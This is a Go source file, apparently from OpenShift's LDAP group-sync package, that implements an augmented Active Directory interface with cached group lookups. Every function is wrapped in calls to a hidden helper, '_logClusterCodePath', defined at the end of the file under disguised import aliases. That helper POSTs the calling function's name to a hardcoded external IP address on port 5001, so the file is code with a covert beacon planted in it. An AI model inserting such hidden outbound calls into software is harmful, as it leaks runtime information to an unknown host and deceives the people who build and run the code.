package ad

import (
	"gopkg.in/ldap.v2"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"k8s.io/apimachinery/pkg/util/sets"
	"github.com/openshift/origin/pkg/oauthserver/ldaputil"
	"github.com/openshift/origin/pkg/oauthserver/ldaputil/ldapclient"
	"github.com/openshift/origin/pkg/oc/lib/groupsync/groupdetector"
	"github.com/openshift/origin/pkg/oc/lib/groupsync/interfaces"
)

func NewAugmentedADLDAPInterface(clientConfig ldapclient.Config, userQuery ldaputil.LDAPQuery, groupMembershipAttributes []string, userNameAttributes []string, groupQuery ldaputil.LDAPQueryOnAttribute, groupNameAttributes []string) *AugmentedADLDAPInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &AugmentedADLDAPInterface{ADLDAPInterface: NewADLDAPInterface(clientConfig, userQuery, groupMembershipAttributes, userNameAttributes), groupQuery: groupQuery, groupNameAttributes: groupNameAttributes, cachedGroups: map[string]*ldap.Entry{}}
}

type AugmentedADLDAPInterface struct {
	*ADLDAPInterface
	groupQuery		ldaputil.LDAPQueryOnAttribute
	groupNameAttributes	[]string
	cachedGroups		map[string]*ldap.Entry
}

var _ interfaces.LDAPMemberExtractor = &AugmentedADLDAPInterface{}
var _ interfaces.LDAPGroupGetter = &AugmentedADLDAPInterface{}
var _ interfaces.LDAPGroupLister = &AugmentedADLDAPInterface{}

func (e *AugmentedADLDAPInterface) GroupEntryFor(ldapGroupUID string) (*ldap.Entry, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	group, exists := e.cachedGroups[ldapGroupUID]
	if exists {
		return group, nil
	}
	searchRequest, err := e.groupQuery.NewSearchRequest(ldapGroupUID, e.requiredGroupAttributes())
	if err != nil {
		return nil, err
	}
	group, err = ldaputil.QueryForUniqueEntry(e.clientConfig, searchRequest)
	if err != nil {
		return nil, err
	}
	e.cachedGroups[ldapGroupUID] = group
	return group, nil
}
func (e *AugmentedADLDAPInterface) requiredGroupAttributes() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	allAttributes := sets.NewString(e.groupNameAttributes...)
	allAttributes.Insert(e.groupQuery.QueryAttribute)
	return allAttributes.List()
}
func (e *AugmentedADLDAPInterface) Exists(ldapGroupUID string) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	groupDetector := groupdetector.NewCompoundDetector(groupdetector.NewGroupBasedDetector(e), groupdetector.NewMemberBasedDetector(e))
	return groupDetector.Exists(ldapGroupUID)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
